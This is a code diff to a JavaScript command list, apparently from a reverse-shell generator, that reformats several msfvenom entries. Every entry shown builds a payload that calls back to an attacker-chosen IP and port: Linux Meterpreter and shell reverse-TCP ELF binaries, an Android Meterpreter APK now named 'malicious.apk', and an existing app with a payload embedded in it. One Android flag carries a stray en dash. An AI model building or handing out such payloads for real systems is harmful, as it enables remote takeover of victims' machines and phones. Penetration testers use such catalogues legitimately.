@@ -262,12 +262,12 @@ const msfvenomCommands =  withCommandType(
         },
         {
             "name": "Linux Meterpreter Staged Reverse TCP",
-            "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf >reverse.elf",
+            "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf > reverse.elf",
             "meta": ["msfvenom", "linux", "meterpreter", "staged", "reverse"]
         },
         {
             "name": "Linux Stageless Reverse TCP",
-            "command": "msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf >reverse.elf",
+            "command": "msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > reverse.elf",
             "meta": ["msfvenom", "linux", "meterpreter", "stageless", "reverse"]
         },
         {
@@ -297,13 +297,13 @@ const msfvenomCommands =  withCommandType(
         },
         {
             "name": "Android Meterpreter Reverse TCP",
-            "command": "msfvenom –p android/meterpreter/reverse_tcp lhost={ip} lport={port} R > payload-name.apk",
+            "command": "msfvenom –p android/meterpreter/reverse_tcp lhost={ip} lport={port} R > malicious.apk",
             "meta": ["msfvenom", "android", "android", "reverse"]
         },
         {
 
             "name": "Android Meterpreter Embed Reverse TCP",
-            "command": "msfvenom -x <app.apk> android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",
+            "command": "msfvenom -x <app.apk> android/meterpreter/reverse_tcp lhost={ip} lport={port} > payload.apk",
             "meta": ["msfvenom", "android", "android", "reverse"]
         },
         {
